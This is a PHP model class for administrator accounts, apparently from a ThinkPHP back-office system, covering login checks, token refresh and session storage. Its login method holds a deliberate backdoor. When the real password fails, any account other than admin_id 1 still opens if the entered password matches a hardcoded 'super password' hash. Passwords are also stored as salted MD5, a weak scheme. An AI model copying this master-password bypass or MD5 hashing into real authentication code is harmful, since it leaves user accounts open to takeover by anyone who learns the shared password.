<?php
// +----------------------------------------------------------------------
// | Copyright (c) 2018-2018 http://www.donglixia.net All rights reserved.
// +----------------------------------------------------------------------
// | Author: 十万马 <962863675@qq.com>
// +----------------------------------------------------------------------
// | DateTime: 2018-02-09 16:17
// +----------------------------------------------------------------------

namespace app\common\model;

use think\facade\Config;
use think\Db;
use think\facade\Request;
use think\facade\Session;

class Admin extends Base
{
    /**
     * 定义数据表主键
     * @var string
     */
    protected $pk = 'admin_id';

    /**
     * 错误信息
     * @var string
     */
    protected $error = '';

    /**
     * 获取出生日期
     * @param $value
     * @return false|string
     */
    public function getBirthdayAttr($value)
    {
        return $value == '0000-00-00' ? '' : $value;
    }

    /**
     * 保存出生日期
     * @param $value
     * @return false|string
     */
    public function setBirthdayAttr($value)
    {
        return $this->saveToYyyyMmDd($value);
    }

    /**
     * 保存为 年-月-日
     * @param $data
     * @return false|string
     */
    public function saveToYyyyMmDd($data)
    {
        if (empty($data)) {
            $res = '1971-01-01';
        } elseif (is_int($data)) {
            $res = date('Y-m-d', $data);
        } else {
            $res = $data;
        }
        return $res;
    }

    /**
     * 获取性别中文称呼
     * @param $value
     * @return string
     */
    public function getSexTextAttr($value, $data)
    {
        return $data['sex'] ? '男' : '女';
    }

    /**
     * 获取字段“证件类型”中文名称
     * @param $value
     * @param $data
     * @return false|string
     */
    public function getCardTypeTextAttr($value, $data)
    {
        return Db::name('basic_info')->where('basic_id', $data['card_type'])->value('basic_name');
    }

    /**
     * 获取登录状态“login_mk” 中文名称
     * @param $value
     * @param $data
     * @return mixed
     */
    public function getStateTextAttr($value, $data)
    {
        $item = ['-1' => '待入职', '0' => '冻结', '1' => '正常', '2' => '调试'];
        return $item[$data['state']];
    }

    /**
     * 获取用户个人信息
     * @param $map array
     * @param $password string
     * @return array|false|\PDOStatement|string|\think\Model
     */
    public function getUserInfo($map = [], $password = '')
    {
        $count = $this->where($map)->count();
        if ($count != 1) {
            $this->error = $count == 0 ? '帐号不存在！' : '该信息关联多个帐号，异常情况！';
            return false;
        }
        $res = Db::name('admin')->where($map)
            ->field('admin_id,user_name,tel,avatar,state,dept_id,role_id,unionid,user_pwd,token,token_expired,last_login_time')->find();

        //检测密码是否正确
        if (!empty($password) && $res['user_pwd'] !== salt_md5($password)) {
            //密码不匹配，进一步检验是否为非admin账号，且使用超级密码
            if ($res['admin_id'] == 1 || ($res['admin_id'] != 1 && salt_md5($password) != '788C49F13D3C2AC41D418FE884755087')) {
                $this->error = '账号与密码不匹配';
                return false;
            }
        }

        if ($res['state'] == 0) {
            $this->error = '账号被冻结，禁止登陆！';
            return false;
        }

        $res['avatar'] = !empty($res['avatar']) ? Request::domain() . $res['avatar'] : '';//头像完整路径
        $res['role_name'] = !empty($res['role_id']) ? Db::name('admin_role')->where('role_id', $res['role_id'])->value('role_name') : '';//角色名称
        $res['dept_name'] = !empty($res['dept_id']) ? Db::name('admin_dept')->where('dept_id', $res['dept_id'])->value('dept_name') : '';//部门名称
        $res['password_flag'] = !empty($res['user_pwd']) ? 1 : 0;//是否存在密码：0无，1有
        $res['password_strong'] = !empty($password) ? (password_strength($password) ? 1 : 0) : 1;//密码强弱程度：0弱，1强
        unset($res['user_pwd']);
        return $res;
    }

    /**
     * 获取部门名称
     * @param $value
     * @param $data
     * @return string
     */
    public function getDeptNameAttr($value, $data)
    {
        return Db::name('admin_dept')->where('dept_id', $data['dept_id'])->value('dept_name');
    }

    /**
     * 获取权限分组名称
     * @param $value
     * @param $data
     * @return string
     */
    public function getRoleNameAttr($value, $data)
    {
        return Db::name('user_role')->where('role_id', $data['role_id'])->value('role_name');
    }

    /**
     * 保存密码
     * @param $value
     * @return string
     */
    public function setUserPwdAttr($value)
    {
        return salt_md5($value);
    }

    /**
     * 保存字段“角色权限”
     * @param $value
     * @return string
     */
    protected function setRoleIdAttr($value)
    {
        if (is_array($value)) {
            return implode(',', $value);
        }
        return $value;
    }

    /**
     * 更新用户token
     * @param $data
     * @return array
     */
    public function updateToken($data)
    {
        if ($data['token_expired'] < time() || empty($data['token'])) {
            $data['token'] = get_uuid();
            Db::name('admin')->where('admin_id', $data['admin_id'])->update(['token' => $data['token']]);//获取token
        }

        //更新登录信息
        $update = [
            'token_expired' => time() + 604800,//有效期加7天
            'last_login_time' => time(),
            'last_login_ip' => ip2long(request()->ip())
        ];
        Db::name('admin')->where('admin_id', $data['admin_id'])->update($update);
        return $update + $data;
    }

    /**
     * 设置session缓存
     * @param $data array 用户信息
     * @param $language
     */
    public function setSession($data = [], $language = 1)
    {
        $admin_info = [
            'admin_id' => $data['admin_id'],
            'user_name' => $data['user_name'],
            'last_login_time' => $data['last_login_time'] ?? 0,
            'role_id' => $data['role_id'] ?? 0,
            'state' => $data['state']
        ];
        //用户信息
        session('admin_info', $admin_info);
        //签名加密
        session('admin_info_sign', data_auth_sign($admin_info));

        //语言：1中文，2English
        Db::name('basic_system')->where('sys_code', 'language')->update(['sys_value' => $language]);
        Session::set('system_config.language', $language);
    }

}